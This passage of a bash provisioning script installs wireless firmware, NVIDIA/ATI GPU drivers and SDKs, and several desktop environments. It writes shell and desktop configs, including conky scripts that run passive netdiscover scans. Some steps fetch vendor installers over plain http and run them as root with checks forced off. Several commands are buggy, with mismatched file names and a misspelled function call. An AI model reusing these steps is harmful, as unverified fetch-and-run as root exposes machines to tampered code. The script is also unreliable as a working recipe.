echo -n "  [*] Installing QLogic IBA7220, QLA1xxx, ISP2xxx and SP2x2 Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-qlogic 1> /dev/null 2> $LOG

time_stop

}

f_QLogic_IBA7220_QLA1xxx_ISP2xxx_SP2x2_Firmware

# Ralink WiFi Firmware
f_ralink_wifi_firmware () {

echo -n "  [*] Installing Ralink WiFi Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-ralink 1> /dev/null 2> $LOG

time_stop

}

f_ralink_wifi_firmware

# Realtek WiFi Firmware
f_realtek_wifi_firmware () {

echo -n "  [*] Installing Realtek WiFi Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-realtek 1> /dev/null 2> $LOG

time_stop

}

f_realtek_wfi_firmware

# Znd1211 Firmware
f_znd1211_firmware () {

echo -n "  [*] Installing zd1211-firmware ... "

timelapsed &

apt-get install -y --force-yes zd1211-firmware 1> /dev/null 2> $LOG

time_stop


}

f_znd1211_firmware

}



# Nvidia (Driver | Cuda | OpenCl)
f_nvidia_buntu_debian () {

echo "[***] Nvidia Driver"

# Driver Base
f_nvidia_driver_base () {

echo -n "  [*] Installing Base Driver ... "

timelapsed &

apt-get remove --purge -y --force-yes xserver-xorg-video-nouveau 1> /dev/null 2> $LOG
apt-get install -y --force-yes xinit xorg 1> /dev/null 2> $LOG

apt-get install -y --force-yes nvidia-current 1> /dev/null 2> $LOG

apt-get install -y --force-yes nvidia-settings 1> /dev/null 2> $LOG

nvidia-xconfig 1> /dev/null

apt-get install -y --force-yes nvclock-gtk 1> /dev/null 2> $LOG

time_stop

}

f_nvidia_driver_base

# Cuda+Opencl
f_cuda_opencl () {

echo -n "  [*] Installing Cuda+OpenCl ... "

timelapsed &

cd /opt
mkdir -p nvidia-driver 1> /dev/null
cd nvidia-driver
axel http://developer.download.nvidia.com/compute/cuda/4_0/drivers/devdriver_4.0_linux_32_270.41.19.run 1> /dev/null  # Cuda Toolkit
##### 64BIT http://developer.download.nvidia.com/compute/cuda/4_0/drivers/devdriver_4.0_linux_64_270.41.19.run
bash devdriver_4.0_linux_32_270.41.19.run 1> /dev/null
rm -f devdriver_4.0_linux_32_270.41.19.run 1> /dev/null
# http://developer.download.nvidia.com/compute/cuda/4_0/sdk/gpucomputingsdk_4.0.17_linux.run 1> /dev/null  # GPGPU SDK
cd ..
rm -fr nvidia-driver

cd $home

time_stop

}

f_cuda_opencl

# Python OpenCl
f_python_opencl () {

echo -n "  [*] Installing Python OpenCl ... "

timelapsed &

apt-get install -y --force-yes python-pyopencl 1> /dev/null 2> $LOG

cd $home

time_stop

}

f_python_opencl

cd $home

}

# Ati (Driver | Stream | Opencl)
f_ati () {

echo "[***] Ati Driver"

# Driver
f_ati_base_driver () {

echo -n "  [*] Installing Base Driver ... "

timelapsed &

cd /opt

axel http://www2.ati.com/drivers/linux/ati-driver-installer-11-7-x86.x86_32.run 1> /dev/null

./ati-driver-installer-11-4-x86.x86_64.run --buildpkg Ubuntu/natty 1> /dev/null

dpkg -i fglrx-modaliases* fglrx-dev_* fglrx-amdcccle_* fglrx_*.deb 1> /dev/null

rm -f fglrx-modaliases_* 1> /dev/null
rm -f fglrx-dev_* 1> /dev/null
rm -f fglrx-amdcccle_* 1> /dev/null
rm -f fglrx_* 1> /dev/null
rm -f fglrx-installer_* 1> /dev/null
rm -f ati-driver-installer-11-4-x86.x86_64.run 1> /dev/null

aticonfig --initial=check 1> /dev/null

cd $home

time_stop

}

f_ati_base_driver

# SDK
f_stream_SDK () {

echo -n "  [*] Stream + SDK ... "

timelapsed &

cd /opt
mkdir -p amdsdk 1> /dev/null
cd amdsdk
axel http://developer.amd.com/Downloads/AMD-APP-SDK-v2.5-lnx32.tgz 1> /dev/null
tar xvf AMD-APP-SDK-v2.5-lnx32.tgz 1> /dev/null
bash Install-AMD-APP.sh 1> /dev/null
cd ..
rm -fr amsdk 1> /dev/null
cd $home
mv $home/.bashrc $home/bashrc2 1> /dev/null
cat bashrc2 | sed -e 's\export LD_LIBRARY_PATH=opt/oracle/instantclient_10_2\export LD_LIBRARY_PATH\g' >> $home/.bashrc 1> /dev/null
rm -f $home/bashrc2 1> /dev/null
echo "
ATISTREAMSDKROOT=/ati-stream-sdk-v2.3-lnx32
ATISTREAMSDKSAMPLESROOT=/ati-stream-sdk-v2.3-lnx32/samples
LD_LIBRARY_PATH=opt/oracle/instantclient_10_2:$ATISTREAMSDKROOT/lib/x86
export ATISTREAMSDKROOT
export ATISTREAMSDKSAMPLESROOT
" >> $home/.bashrc

time_stop

}

f_stream_SDK

# Call++
f_call_++ () {

echo -n "  [*] Call++ ... "

timelapsed &

cd /opt
axel http://heanet.dl.sourceforge.net/project/calpp/calpp-0.90/calpp-0.90.tar.gz 1> /dev/null
tar xvfz calpp-0.90.tar.gz 1> /dev/null
cd  callpp-0.90
apt-get install -y --force-yes libboost-dev cmake 1> /dev/null
cmake . 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -f calpp-0.90.tar.gz 1> /dev/null
rm -fr callpp-0.90 1> /dev/null

cd $home

time_stop

}

f_call_++

# Python OpenCl
f_python_opencl () {

echo -n "  [*] Installing Python OpenCl ... "

timelapsed &

apt-get install -y --force-yes python-pyopencl 1> /dev/null 2> $LOG

cd $home

time_stop

}

f_python_opencl

}



# Desktop Manager
f_gnome_buntu () {

echo -n "[*] Installing Gnome ... "

timelapsed &

apt-get install -y --force-yes gnome-core gdm 1> /dev/null 2> $LOG
apt-get install -y --force-yes gnome-session 1> /dev/null 2> $LOG
apt-get install -y --force-yes gnome-shell 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-actions 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-cd-burner 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-gksu 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-ideviceinfo 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-image-converter 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-open-terminal 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-wallpaper 1> /dev/null 2> $LOG
apt-get install -y --force-yes gnome-tweak-tool 1> /dev/null 2> $LOG

time_stop

}

f_gnome_debian () {

echo -n "[*] Installing Gnome ... "

timelapsed &

apt-get install -y --force-yes gnome-core gdm 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-actions 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-cd-burner 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-gksu 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-ideviceinfo 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-image-converter 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-open-terminal 1> /dev/null 2> $LOG
apt-get install -y --force-yes nautilus-wallpaper 1> /dev/null 2> $LOG

time_stop

}

f_kde_buntu_debian () {

echo -n "[*] Installing KDE ... "

timelapsed &

apt-get install -y --force-yes kdm kde-plasma-desktop kmix kdeplasma-addons gtk2-engines-oxygen partitionmanager phonon polkit-kde-1 qtcurve kdeutils kmousetool kdeutils 1> /dev/null 2> $LOG
apt-get install -y --force-yes kdeartwork 1> /dev/null 2> $LOG

time_stop

}

f_xfce_buntu_debian () {

echo -n "[*] Installing XFCE ... "

timelapsed &

apt-get install -y --force-yes xfce4 1> /dev/null 2> $LOG

apt-get install -y --force-yes xfce4-goodies 1> /dev/null 2> $LOG

apt-get install -y --force-yes xfce4-cddrive-plugin 1> /dev/null 2> $LOG

apt-get install -y --force-yes xfce4-cellmodem-plugin 1> /dev/null 2> $LOG

apt-get install -y --force-yes xfce4-notifyd 1> /dev/null 2> $LOG

apt-get install -y --force-yes xfce4-power-manager-plugin 1> /dev/null 2> $LOG

apt-get install -y --force-yes xfce4-volumed 1> /dev/null 2> $LOG

time_stop

}

f_lxde_buntu_debian () {

echo -n " Installing LXDE ... "

timelapsed &

apt-get install -y --force-yes lxde 1> /dev/null 2> $LOG

apt-get install -y --force-yes lxdm 1> /dev/null 2> $LOG

apt-get install -y --force-yes lubuntu-control-center 1> /dev/null 2> $LOG

apt-get install -y --force-yes lxproxy 1> /dev/null 2> $LOG

time_stop

}

f_enlight () {

echo -n "Enlightment not done yet ... "

timelapsed &

time_stop

f_menu

}

f_openbox_standalone_buntu_debian () {

echo -n "[***] OpenBox StandAlone "

timelapsed &

# Xinit + Xorg
f_xinit_xorg () {

echo "  [*] Installing Xinit + Xorg ... "

apt-get install -y --force-yes xinit xorg 1> /dev/null 2> $LOG

}

f_xinit_xorg

# LxRandr
f_lxrandr () {

echo "  [*] Installing LxRandr ... "

apt-get install -y --force-yes lxrandr 1> /dev/null 2> $LOG

}

f_lxrandr

# DMZ-Cursor-Theme
f_dmz_cursor_theme () {

echo "  [*] Installing DMZ-Cursor-Theme ... "

apt-get install -y --force-yes dmz-cursor-theme 1> /dev/null 2> $LOG

}

f_dmz_cursor_theme

# Cairo-Comprmg
f_cairo_comprmg () {

echo "  [*] Installing Cairo-Comprmg ... "

apt-get install -y --force-yes cairo-compmgr cairo-compmgr-plugins 1> /dev/null 2> $LOG

#cd /opt
#git clone git://git.tuxfamily.org/gitroot/ccm/cairocompmgr.git cairo-compmgr
#cd cairo-compmgr

}

f_cairo_comprmg

# Bashrc
f_bashrc () {

cd $home
rm -f .bashrc
touch .bashrc

# color: PS1='\[\e[0;31m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[0;31m\]\$ \[\e[m\]\[\e[0;32m\]'

f_writing_bashrc () {

echo "# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z £+harrypotterPS1£+ ] && return

# don't put duplicate lines in the history. See bash(1) for more options
# ... or force ignoredups and ignorespace
HISTCONTROL=ignoredups:ignorespace

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval £+harrypotter(SHELL=/bin/sh lesspipe)£+

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z £+harrypotterdebian_chroot£+ ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=harrypotter(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we £+want£+ color)
case £+harrypotterTERM£+ in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n £+harrypotterforce_color_prompt£+ ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ £+harrypottercolor_prompt£+ = yes ]; then
    PS1='\[\e[0;31m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[0;31m\]\harrypotter \[\e[m\]\[\e[0;32m\]'
else
    PS1='harrypotter{debian_chroot:+(harrypotterdebian_chroot)}\u@\h:\w\harrypotter '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case £+harrypotterTERM£+ in
xterm*|rxvt*)
    PS1=£+\[\e]0;harrypotter{debian_chroot:+(harrypotterdebian_chroot)}\u@\h: \w\a\]harrypotterPS1£+
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval £+harrypotter(dircolors -b ~/.dircolors)£+ || eval £+harrypotter(dircolors -b)£+
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an £+alert£+ alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i £+harrypotter([ harrypotter? = 0 ] && echo terminal || echo error)£+ £+harrypotter(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alertharrypotter//'\'')£+'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
    . /etc/bash_completion
fi

export RUBYOPT=/rubygems/
" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> .bashrc

echo "$home/.bashrc" >> $file

}

f_writing_bashrc

}

f_bashrc


# Xdotool
f_xdotool () {

echo "  [*] Installing Xdotool ... "

apt-get install -y --force-yes xdotool 1> /dev/null 2> $LOG

cd /usr/share/applications
rm -f tint2menu.desktop
touch tint2menu.desktop
echo "
[Desktop Entry]
Encoding=UTF-8
Name=tint2menu
Comment=Openbox menu button for tint2
Exec=xdotool key S+C+A+space
Terminal=false
Type=Application
Icon=printer
StartupNotify=true
X-Ubuntu-Gettext-Domain=tint2menu
" >> /usr/share/applications/tint2menu.desktop

echo "/usr/share/applications" >> $file
echo "/usr/share/applications/tint2menu.desktop" >> $file

cd $home

}

f_xdotool

# Xdefaults
f_xdef () {

echo "  [*] Editing Xdefaults ... "
cd $home
rm -f .Xdefaults
touch .Xdefaults
echo "! Xcursor --------------------------------------------------------------------

Xcursor.theme: DMZ-Black
Xcursor.size:  22


" >> $home/.Xdefaults

echo "$home/.Xdefaults" >> $file

}

f_xdef

# Roxterm
f_roxterm () {

echo "  [*] Installing Roxterm ... "

apt-get install -y --force-yes roxterm 1> /dev/null 2> $LOG

cd $home/.config
mkdir -p roxterm.sourceforge.net 1> /dev/null
echo "$home/.config/roxterm.sourceforge.net" >> $file

cd roxterm.sourceforge.net
rm -f Global 1> /dev/null
touch Global 1> /dev/null

echo "

[roxterm options]
warn_close=1

" >> Global
echo "$home/.config/roxterm.sourceforge.net/Global" >> $file
mkdir -p Colours 1> /dev/null
echo "$home/.config/roxterm.sourceforge.net/Colours" >> $file
cd Colours
rm -f GTK 1> /dev/null
touch GTK 1> /dev/null

echo "

[roxterm colour scheme]
foreground=#000000000000
background=#f0f0f0f0f0f0
palette_size=16
0=#000000000000
1=#969600000000
2=#000096960000
3=#aaaa55550000
4=#00000000aaaa
5=#a0a00000a0a0
6=#000096969696
7=#f0f0f0f0f0f0
8=#646464646464
9=#f0f050505050
10=#4949dcdc4949
11=#b8b8b8b81e1e
12=#55555555ffff
13=#e6e64c4ce6e6
14=#0000c8c8c8c8
15=#ffffffffffff
cursor=#939309b609b6
16=#4c4c4c4c4c4c
17=#a8a830303030
18=#202088882020
19=#a8a888880000
20=#555555559898
21=#888830308888
22=#303088888888
23=#d8d8d8d8d8d8
" >> GTK
echo "$home/.config/roxterm.sourceforge.net/Colours/GTK" >> $file
cd ..
mkdir -p Profiles 1> /dev/null
echo "$home/.config/roxterm.sourceforge.net/Profiles" >> $file
cd Profiles
rm -fr Default 1> /dev/null
touch Default 1> /dev/null

echo "

[roxterm profile]
exit_action=1
browser=firefox
background_type=2
saturation=0,990000
show_tab_status=1
hide_menubar=1
always_show_tabs=0
" >> Default
echo "$home/.config/roxterm.sourceforge.net/Profiles/Default" >> $file

cd $home

}

f_roxterm

# Nitrogen
f_nitrogen () {

echo "  [*] Nitrogen ... "
apt-get install -y --force-yes nitrogen 1> /dev/null 2> $LOG

cd $home/.config
mkdir -p nitrogen 1> /dev/null
echo "$home/.config/nitrogen" >> $file
cd nitrogen
echo "      Downloading Wallpaper"
#axel http://imagik.fr/uploads/447255 1> /dev/null
# echo "$home/.config/nitrogen/" >> $file

rm -f bg-saved.conf 1> /dev/null
touch bg-saved.conf 1> /dev/null

echo "
[:0.0]
file=£+$home/.config/nitrogen/447255£+
mode=4
bgcolor=#000000
" | sed -e 's/£+/"/g' >> bg-saved.conf
echo "$home/.config/nitrogen/bg-saved.conf" >> $file

rm -f bg-saved.cfg
touch bg-saved.cfg

echo "tr
[:0.0]
file=£+$home/.config/nitrogen/447255£+
mode=4
bgcolor=#000000
" | sed -e 's/£+/"/g' >>  bg-saved.cfg
echo "$home/.config/nitrogen/bg-saved.cfg" >> $file

rm -f nitrogen.cfg
touch nitrogen.cfg

echo "
[geometry]
posx=0
posy=0
sizex=450
sizey=500

[nitrogen]
view=icon
icon_caps=false
dirs=

" >> nitrogen.cfg
echo "$home/.config/nitrogen/nitrogen.cfg" >> $file

cd $home

}

f_nitrogen

# Thunar
f_thunar () {

echo "  [*] Installing Thunar ... "
apt-get install -y --force-yes thunar thunar-archive-plugin thunar-media-tags-plugin thunar-volman thunar-thumbnailers ffmpegthumbnailer 1> /dev/null 2> $LOG
apt-get remove --purge -y --force-yes xfce4-panel 1> /dev/null 2> $LOG

cd $home/.config
mkdir -p Thunar 1> /dev/null
echo "$home/.config/Thunar" >> $file
cd Thunar
rm -f volmanrc 1> /dev/null
touch volmanrc 1> /dev/null

echo "
[Configuration]
AutomountMedia = TRUE
AutomountDrives = TRUE
" >> volmanrc
echo "$home/.config/Thunar/volmanrc" >> $file

rm -f thunarrc
touch thunarrc 1> /dev/null

echo "
[Configuration]
DefaultView=ThunarIconView
LastCompactViewZoomLevel=THUNAR_ZOOM_LEVEL_SMALLEST
LastDetailsViewColumnOrder=THUNAR_COLUMN_NAME,THUNAR_COLUMN_SIZE,THUNAR_COLUMN_TYPE,THUNAR_COLUMN_DATE_MODIFIED
LastDetailsViewColumnWidths=
LastDetailsViewFixedColumns=FALSE
LastDetailsViewVisibleColumns=THUNAR_COLUMN_DATE_MODIFIED,THUNAR_COLUMN_NAME,THUNAR_COLUMN_SIZE,THUNAR_COLUMN_TYPE
LastDetailsViewZoomLevel=THUNAR_ZOOM_LEVEL_SMALLER
LastIconViewZoomLevel=THUNAR_ZOOM_LEVEL_NORMAL
LastLocationBar=ThunarLocationEntry
LastSeparatorPosition=170
LastShowHidden=TRUE
LastSidePane=ThunarShortcutsPane
LastSortColumn=THUNAR_COLUMN_NAME
LastSortOrder=GTK_SORT_ASCENDING
LastStatusbarVisible=TRUE
LastView=ThunarIconView
LastWindowHeight=480
LastWindowWidth=640
MiscVolumeManagement=TRUE
MiscCaseSensitive=FALSE
MiscDateStyle=THUNAR_DATE_STYLE_SHORT
MiscFoldersFirst=TRUE
MiscHorizontalWheelNavigates=FALSE
MiscRecursivePermissions=THUNAR_RECURSIVE_PERMISSIONS_ASK
MiscRememberGeometry=TRUE
MiscShowAboutTemplates=TRUE
MiscShowThumbnails=TRUE
MiscSingleClick=FALSE
MiscSingleClickTimeout=500
MiscTextBesideIcons=FALSE
ShortcutsIconEmblems=TRUE
ShortcutsIconSize=THUNAR_ICON_SIZE_SMALLER
TreeIconEmblems=TRUE
TreeIconSize=THUNAR_ICON_SIZE_SMALLEST

" >> thunarrc
echo "$home/.config/Thunar/thunarrc" >> $file

}

f_thunar

# Conky
f_conky () {

echo "  [*] Installing Conky ... "
apt-get install -y --force-yes conky-all 1> /dev/null 2> $LOG

cd $home/.config
mkdir -p conky 1> /dev/null
echo "$home/.config/conky" >> $file
cd conky
rm -f conkyrc 1> /dev/null
touch conkyrc

f_writing_conkyrc () {

echo "use_xft yes
xftfont Sans:size=8
override_utf8_locale yes
text_buffer_size 384
background yes
update_interval 1
total_run_times 0
own_window yes
own_window_type override
own_window_transparent yes
imlib_cache_size 0
double_buffer yes
draw_shades no
draw_outline no
draw_borders no
draw_graph_borders yes
out_to_ncurses no
out_to_console no
alignment top_right
minimum_size 240 0
maximum_width 1000
gap_x 10
gap_y 33
short_units yes
pad_percents 0
border_inner_margin 4
top_name_width 6
no_buffers yes
uppercase no
cpu_avg_samples 2
net_avg_samples 2
use_spacer left


TEXT

s{color green}SYSTEM  s{color darkgrey}s{hr 2}
s{color white}s{sysname} s{kernel}s{alignr}s{machine}
s{color white}System Uptimes{alignr}s{uptime_short}
s{color white}Processes s{alignr}$processes ($running_processes running)

s{color green}PROCESSORS  s{color darkgrey}s{hr 2}
s{color white}CPU1 s{freq_g 1} GHz s{color darkgrey}s{cpubar cpu1 8,130}s{alignr}s{color orange}s{cpu cpu1}%
s{color white}CPU2 s{freq_g 2} GHz s{color darkgrey}s{cpubar cpu2 8,130}s{alignr}s{color orange}s{cpu cpu2}%

s{color green}MEMORY  s{color darkgrey}s{hr 2}
s{color white}RAM   s{color orange}s{mem} / s{memmax}s{alignr}s{color red}s{memperc}% Used
s{color darkgrey}s{membar}

s{color green}HDD  s{color darkgrey}s{hr 2}s{font}
s{color white}ROOT   s{color orange}s{fs_used /} / s{fs_size /}s{alignr}s{color red}s{color red}s{fs_free_perc /}% Free
s{color darkgrey}s{fs_bar /}
s{if_existing /media/TOSHIBA_EXT}s{color white}TOSHIBA_EXT   s{color orange}s{fs_used /media/TOSHIBA_EXT} / s{fs_size /media/TOSHIBA_EXT}s{alignr}s{color red}s{fs_free_perc /media/TOSHIBA_EXT}% Free
s{color darkgrey}s{fs_bar /media/TOSHIBA_EXT}s{endif}
s{if_existing /media/Amule_TMP}s{color white}Amule_TMP   s{color orange}s{fs_used /media/Amule_TMP} / s{fs_size /media/Amule_TMP}s{alignr}s{color red}s{fs_free_perc /media/Amule_TMP}% Free
s{color darkgrey}s{fs_bar /media/Amule_TMP}s{endif}
s{if_existing /media/Wordlist}s{color white}Wordlist   s{color orange}s{fs_used /media/Wordlist} / s{fs_size /media/Wordlist}s{alignr}s{color red}s{fs_free_perc /media/Wordlist}% Free
s{color darkgrey}s{fs_bar /media/Wordlist}s{endif}


s{color green}NETWORK INTERFACES s{color darkgrey}s{hr 2}s{font}
s{color yellow}s{execi 300 $home/.config/conky/ip.sh}s{color blue}Open Ports: s{color yellow}s{tcp_portmon 1 65535 count}s{alignr}s{color red}s{execi 300 $home/.config/conky/arp.sh}
s{if_match £+s{addr eth0}£+ != £+No Address£+}s{color blue}Eth0  s{execi 300 $home/.config/conky/netdiscover_eth0.sh}  s{alignr}s{color yellow}s{addr eth0}
s{color white}DownSpeed: s{color orange}s{downspeed eth0} k/s s{alignr}s{color white}UpSpeed: s{color orange}s{upspeed eth0} k/s
s{color white}TotalDown: s{color orange}s{totaldown eth0} s{alignr}s{color white}TotalUp: s{color orange}s{totalup eth0}
s{if_existing $home/.netdiscover_eth0.txt}s{color red}IP  s{alignr}s{color red}MAC
s{color white}s{execi 15 cat $home/.netdiscover_eth0.txt | awk '{print s1}' } s{alignr}s{color white}s{execi 15 cat $home/.netdiscover_eth0.txt | awk '{print s2}' }s{endif}s{endif}
s{if_match £+s{addr wlan0}£+ != £+No Address£+}s{color blue}Wlan0  s{execi 300 $home/.config/conky/netdiscover_wlan0.sh}  s{alignr}s{color yellow}s{addr wlan0}
s{color white}AP: s{color orange}s{wireless_essid wlan0} s{alignr}s{color white}MAC AP: s{color red}s{wireless_ap wlan0}
s{color white}Bitrate: s{color orange}s{wireless_bitrate wlan0}  s{alignr}s{color white}Mode: s{color orange}s{wireless_mode wlan0}
s{color white}Link Quality   s{color orange}s{wireless_link_qual_perc wlan0}% s{color darkblue}s{wireless_link_bar wlan0}
s{color white}DownSpeed: s{color orange}s{downspeed wlan0} k/s s{alignr}s{color white}UpSpeed: s{color orange}s{upspeed wlan0} k/s
s{color white}TotalDown: s{color orange}s{totaldown wlan0} s{alignr}s{color white}TotalUp: s{color orange}s{totalup wlan0}
s{if_existing $home/.netdiscover_wlan0.txt}s{color red}IP  s{alignr}s{color red}MAC
s{color white}s{execi 15 cat $home/.netdiscover_wlan0.txt | awk '{print s1}' } s{alignr}s{color white}s{execi 15 cat $home/.netdiscover_wlan0.txt | awk '{print s2}' }s{endif}s{endif}

" | sed -e 's/£+/"/g' | sed -e 's/s1/$1/g' | sed -e 's/s2/$2/g' | sed -e 's/s{/${/g' > conkyrc

}

f_writing_conkyrc
echo "$home/.config/conky/conkyrc" >> $file

rm -f ip.sh 1> /dev/null
touch ip.sh 1> /dev/null

echo "#!/bin/bash

echo -n £+   £+
wget -q -O - checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*harrypotter//'

" | sed -e 's/harrypotter/$/g' | sed -e 's/£+/"/g' >> ip.sh
echo "$home/.config/conky/ip.sh" >> $file

rm -f arp.sh
touch arp.sh

echo "#!/bin/sh

arp -an | awk '{print harrypotter4}' | sort | uniq -c | grep -v ' 1 '

if [ £+harrypotter?£+ -eq 0 ]; then
        a=harrypotter( arp -an | awk '{print harrypotter4}' | sort | uniq -c | grep -v ' 1 ' )
        echo £+ARP From harrypottera !!!£+
fi

exit 0
" | sed -e 's/£+/"/g' -e 's/harrypotter/$/g' >> arp.sh
echo "$home/.config/conky/arp.sh" >> $file

rm -f netdiscover_eth0.sh
touch netdiscover_eth0.sh

echo "#!/bin/bash

pkill netdiscover
sleep 3
rm -f $home/.netdiscover_eth0.txt

( netdiscover -p -P -N -i eth0 >> $home/.netdiscover_eth0.txt ) &

exit 0
" >> netdiscover_eth0.sh
echo "$home/.config/conky/netdiscover_eth0.sh" >> $file

rm -f netdiscover_wlan0.sh
touch netdiscover_wlan0.sh

echo "#!/bin/bash

pkill netdiscover
sleep 3
rm -f $home/.netdiscover_wlan0.txt

( netdiscover -p -P -N -i wlan0 >> $home/.netdiscover_wlan0.txt ) &

exit 0
" >> netdiscover_wlan0.sh
echo "$home/.config/conky/netdiscover_wlan0.sh" >> $file

cd $home

}

f_conky

# Tint2
f_tint2_sources () {

echo " [**] Tint2"
cd /opt
echo "  [*] Installing Dependencies ... "
apt-get install -y --force-yes build-essential cmake subversion libcairo2-dev libpango1.0-dev libglib2.0-dev libgtk-2.0-0 libc6 libimlib2-dev libxinerama-dev libx11-dev libxdamage-dev libxcomposite-dev libxrender-dev libxrandr-dev 1> /dev/null 2> $LOG

echo "  [*] Downloading Subversion Code ... "
svn checkout http://tint2.googlecode.com/svn/trunk/ tint2-read-only 1> /dev/null 2> $LOG
cd tint2-read-only
mkdir -p build
cd build

echo "  [*] Make and Make Install ... "
cmake -DCMAKE_INSTALL_PREFIX=/usr ../ 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr tint2-read-only
cd $home/.config
mkdir -p tint2
echo "$home/.config/tint2" >> $file
cd tint2
touch tint2rc

f_writing_tint2rc () {

echo "# Tint2 config file

#-----------------------------
# Background definitions
#-----------------------------

# ID 1 # idle task
rounded = 10
border_width = 0
background_color = #000000 0
border_color = #000000 50

# ID 2 # tooltip
rounded = 10
border_width = 0
background_color = #000000 30
border_color = #000000 70

# ID 3 # active task
rounded = 10
border_width = 0
background_color = #000000 10
border_color = #000000 70

# ID 4 # Panel
rounded = 7
border_width = 0
background_color = #000000 50
border_color = #000000 20


#-----------------------------
# Panel
#-----------------------------
panel_monitor = all
panel_position = top center horizontal
panel_size = 95% 38
panel_margin = 0 0
panel_padding = 5 3 2
panel_dock = 0
wm_menu = 1
panel_items =  LTSBC
panel_background_id = 4

#-----------------------------
# Taskbar
#-----------------------------
taskbar_mode = multi_desktop
taskbar_padding = 1 1 1
taskbar_background_id = 1
taskbar_active_background_id = 3

#-----------------------------
# Tasks
#-----------------------------
task_icon = 1
task_text = 0
task_centered = 1
task_maximum_size = 30
task_padding = 0 0 0
task_background_id = 0
task_active_background_id = 0
task_active_icon_asb = 100 0 0
task_icon_asb = 30 0 -10

#-----------------------------
# Fonts
#-----------------------------
task_font = snap.se 8
task_font_color = #A1A1A1 100
task_active_font_color = #B1B1B1 100
font_shadow = 0

#-----------------------------
# Systray
#-----------------------------
systray = 1
systray_padding = 2 0 0
systray_sort = ascending
systray_background_id = 0

#-----------------------------
# Clock
#-----------------------------
time1_format = %H:%M
time1_font = snap.se 12
time2_format = %d %a
time2_font = snap.se 8
clock_font_color = #555555 100
clock_padding = 2 0
clock_background_id = 0

#-----------------------------
# Mouse
#-----------------------------
mouse_middle = none
mouse_right = close
mouse_scroll_up = toggle_iconify
mouse_scroll_down = toggle_iconify

#-----------------------------
# Battery
#-----------------------------
battery = 1
battery_low_status = 20
battery_low_cmd = notify-send £+battery low£+
bat1_font = Sans 12
bat2_font = Sans 12
battery_font_color = #555555 100
battery_padding = 2 0
battery_background_id = 0

#---------------------------------------------
# Tooltip
#---------------------------------------------
tooltip = 1
tooltip_padding = 2 2
tooltip_show_timeout = 1
tooltip_hide_timeout = 0.5
tooltip_background_id = 2
tooltip_font_color = #555555 90
tooltip_font = snap.se bold 9

#--------------------------------------------
# Lanchers
#--------------------------------------------
launcher_icon_theme = LinuxLex-8
launcher_padding = 5 0 10
launcher_background_id = 9
launcher_icon_size = 36
launcher_item_app = /usr/share/applications/tint2menu.desktop


" | sed -e 's/£+/"/g' >> tint2rc

}

f_writing_tint2rc

cd $home

}

f_tint2 () {

echo "  [*] Installing Tint2 ..."
apt-get install -y --force-yes tint2 1> /dev/null 2> $LOG

cd $home/.config
mkdir -p tint2
echo "$home/.config/tint2" >> $file
cd tint2
touch tint2rc


f_writing_tint2rc () {

echo "# Tint2 config file

#-----------------------------
# Background definitions
#-----------------------------

# ID 1 # idle task
rounded = 10
